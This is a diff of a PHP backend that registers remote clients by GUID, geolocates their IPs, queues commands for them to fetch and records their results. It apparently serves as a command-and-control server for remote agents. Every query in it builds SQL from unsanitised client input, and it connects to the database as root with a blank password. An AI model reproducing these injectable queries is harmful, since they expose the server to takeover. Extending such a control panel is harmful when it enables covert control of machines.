@@ -12,6 +12,20 @@ $Server = 'localhost';
 $User = 'root';
 $Pass = '';
 
+function ArrayToINI(array $a, array $parent = array()){
+    $out = '';
+    foreach ($a as $k => $v){
+        if (is_array($v)){
+            $sec = array_merge((array) $parent, (array) $k);
+            $out .= PHP_EOL . '[' . join('.', $sec) . ']' . PHP_EOL;
+            $out .= ArrayToINI($v, $sec);
+        } else {
+            $out .= "$k=$v" . PHP_EOL;
+        }
+    }
+    return $out;
+}
+
 function IsOnline($_LastSeen, $MaxMinDiff){
 	$CurrentTime = strtotime(date("Y-m-d H:i:s"));
 	$Diff = round(($CurrentTime - strtotime($_LastSeen)) / 60, 2);
@@ -25,7 +39,6 @@ function ConnectDB($DBName){
 }
 
 function GetLocation($_IP){
-	LogStr("Geolocation update for $_IP");
 	if($_IP=="127.0.0.1") return "[??] Localhost";
 	else {
 		$Req = @unserialize(file_get_contents('http://ip-api.com/php/' . $_IP . '?fields=country,countryCode,regionName,city,status'));
@@ -36,7 +49,6 @@ function GetLocation($_IP){
 }
 
 function UpdateLastSeen($_GUID){
-	//LogStr("LastSeen update for $_GUID");
 	global $Conn;
 	$Now = date("Y-m-d H:i:s");
 	$Sql = "UPDATE clients SET LastSeen='$Now' WHERE GUID = '$_GUID';";
@@ -45,6 +57,7 @@ function UpdateLastSeen($_GUID){
 	$Result = $Conn->query($Sql);
 	$Entry = $Result->fetch_assoc();
 	if($Entry['IPAddress']!=$_SERVER['REMOTE_ADDR']){
+		LogStr("Geolocation -->\t$_GUID");
 		$Entry = $_SERVER['REMOTE_ADDR'];
 		$Loc = GetLocation($Entry);
 		$Sql = "UPDATE clients SET IPAddress='$Entry', Location='$Loc' WHERE GUID = '$_GUID';";
@@ -83,7 +96,6 @@ function ClientExists($_GUID){
 }
 
 function GetCommands($_GUID, $_Silent){
-	//LogStr("Returning commands for $_GUID");
 	if(!$_Silent) UpdateLastSeen($_GUID);
 	global $Conn;
 	$Sql = "SELECT Commands FROM clients WHERE GUID = '$_GUID';";
@@ -93,15 +105,14 @@ function GetCommands($_GUID, $_Silent){
 }
 
 function RegisterClient($_GUID){
-	LogStr("New client connected: $_GUID");
-	//LastSeen is automatically set
+	LogStr("New client -->\t$_GUID");
 	global $Conn;
 	$Sql = "INSERT INTO clients (GUID) VALUES ('$_GUID');";
 	return ($Conn->query($Sql));
 }
 
 function RemoveClient($_GUID){
-	LogStr("Uninstalling: $_GUID");
+	LogStr("Removing -->\t$_GUID");
 	global $Conn;
 	$Sql = "DELETE FROM clients WHERE GUID = '$_GUID';";
 	return ($Conn->query($Sql));
@@ -126,22 +137,15 @@ function CompleteRegister($_GUID, $Values){
 	return ($Conn->query($Sql));
 }
 
-function GetINIProperty($_Text, $Name){
-	$Text = $_Text;
-	$Text = substr($Text, strpos($Text, $Name . '=') + strlen($Name . '='));
-	$Text = substr($Text, 0, strpos($Text, "\r\n"));
-	return $Text;
-}
-
 function GenName(){
 	return sprintf("%u", crc32(time()+rand(1, 100)));
 }
 
 function QueueCommand($_GUID, $Command, $Params, $OpName){
 	global $Conn;
-	$Text = GetCommands($_GUID, true);
-	$Count = GetINIProperty($Text, 'CommandCount');
-	$Names = GetINIProperty($Text, 'Commands');
+	$Cmds = parse_ini_string(GetCommands($_GUID, true), true);
+	$Count = $Cmds["General"]["CommandCount"];
+	$Names = $Cmds["General"]["Commands"];
 	if($Command=='Abort'){
 		if(strpos($Names, $Params['CommandID']) === false) return true;
 		$Sql = "SELECT LastSeen FROM clients WHERE GUID = '$_GUID';";
@@ -152,20 +156,20 @@ function QueueCommand($_GUID, $Command, $Params, $OpName){
 			return true;
 		}
 	}
-	if($Count>0)
-		for($i = 1; $i<=2; $i++) $Text = substr($Text, strpos($Text, '[')+(2-$i));
-	else $Text = "";
 	if(isset($OpName['NewName'])) $NewName = $OpName['NewName'];
 	else $NewName = GenName();
-	LogStr("Queuing command $Command --> name $NewName for $_GUID");
+	$Who = "System";
+	if(isset($_SESSION['user'])) $Who = $_SESSION['user'];
+	LogStr($Who . " queued $Command [$NewName] -->\t$_GUID");
 	$Count++;
 	if($Count==1) $Names = $NewName; else $Names .= ',' . $NewName;
-	$Text = '[General]\r\nCommandCount=' . $Count . '\r\nCommands=' . $Names . '\r\n\r\n' . $Text;
-	$Text .= '\r\n[' . $NewName . ']\r\n';
-	$Text .= 'Type=' . $Command . '\r\n';
+	$Cmds["General"]["CommandCount"] = $Count;
+	$Cmds["General"]["Commands"] = $Names;
+	$Cmds[$NewName]["Type"] = $Command;
 	foreach($Params as $ParamName => $ParamStr){
-		$Text .= $ParamName . '=' . addslashes($ParamStr) . '\r\n';
+		$Cmds[$NewName][$ParamName] = addslashes($ParamStr);
 	}
+	$Text = str_replace(PHP_EOL, '\r\n', ArrayToINI($Cmds));
 	$Sql = "UPDATE clients SET Commands='$Text' WHERE GUID = '$_GUID';";
 	return ($Conn->query($Sql));
 }
@@ -191,12 +195,11 @@ function QueueCommandEx($_Target, $Command, $Params){
 }
 
 function RemoveCommand($_GUID, $ID){
-	LogStr("Removing command $ID from $_GUID");
+	LogStr("Completed [$ID] -->\t$_GUID");
 	global $Conn;
-	$Text = GetCommands($_GUID, false);
-	$Count = GetINIProperty($Text, 'CommandCount');
-	$Count--;
-	$Names = GetINIProperty($Text, 'Commands');
+	$Cmds = parse_ini_string(GetCommands($_GUID, false), true);
+	$Cmds["General"]["CommandCount"]--;
+	$Names = $Cmds["General"]["Commands"];
 	if(strpos(" " . $Names, $ID)){
 		$Names = str_replace($ID, '', $Names);
 		if(strlen($Names)>0){
@@ -204,20 +207,16 @@ function RemoveCommand($_GUID, $ID){
 			if($Names[strlen($Names) - 1]==',') $Names = substr($Names, 0, strlen($Names) - 1);
 		}
 		$Names = str_replace(',,', ',', $Names);
-		for($i = 1; $i<=2; $i++) $Text = substr($Text, strpos($Text, '[')+(2-$i));
-		$Part1 = substr($Text, 0, strpos($Text, $ID) - 1);
-		$Text = substr($Text, strpos($Text, $ID));
-		if(strpos(" " . $Text, '['))
-			$Text = substr($Text, strpos($Text, '['));
-		else $Text = '';
-		$Text = '[General]\r\nCommandCount=' . $Count . '\r\nCommands=' . $Names . '\r\n\r\n' . $Part1 . $Text;
+		$Cmds["General"]["Commands"] = $Names;
+		unset($Cmds[$ID]);
+		$Text = str_replace(PHP_EOL, '\r\n', ArrayToINI($Cmds));
 	}
 	$Sql = "UPDATE clients SET Commands='$Text' WHERE GUID = '$_GUID';";
 	return ($Conn->query($Sql));
 }
 
 function SetResult($_GUID, $Result){
-	LogStr("Setting result \"$Result\" for $_GUID");
+	LogStr("Result \"$Result\" -->\t$_GUID");
 	UpdateLastSeen($_GUID);
 	global $Conn;
 	$Sql = "UPDATE clients SET Result='$Result' WHERE GUID = '$_GUID';";
